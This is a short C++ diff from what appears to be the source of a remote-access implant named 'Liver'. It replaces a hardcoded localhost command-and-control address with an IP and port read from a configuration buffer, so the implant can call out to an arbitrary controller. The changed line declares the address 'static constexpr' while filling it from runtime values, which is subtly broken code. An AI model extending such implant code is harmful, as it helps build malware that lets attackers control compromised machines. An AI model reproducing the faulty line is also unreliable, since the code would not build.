@@ -2,6 +2,8 @@
 
 #include "CommandHandlerFactory.hpp"
 #include "ICommandHandler.hpp"
+#include "Json.hpp"
+#include "LiverConfiguration.hpp"
 #include "Trace.hpp"
 #include "CommandFactories/JsonCommandFactory.hpp"
 #include "Commands/ICommand.hpp"
@@ -44,9 +46,8 @@ void Liver::run()
 
 std::unique_ptr<Liver> Liver::create([[maybe_unused]] const Buffer& liver_configuration)
 {
-	static constexpr uint32_t LOCALHOST = 0x7f000001;
-	static constexpr uint16_t DEFAULT_PORT = 8080;
-	static constexpr SocketAddress cnc_address = {LOCALHOST, DEFAULT_PORT};
+	const LiverConfiguration config = LiverConfiguration::parse(liver_configuration);
+	static constexpr SocketAddress cnc_address = {config.cnc_ip, config.cnc_port};
 	static constexpr Time::Duration ITERATION_TIMEOUT = Time::Seconds(15);
 	return std::make_unique<Liver>(
 		std::make_shared<Event>(quit_event_name(), Event::Type::MANUAL_RESET),
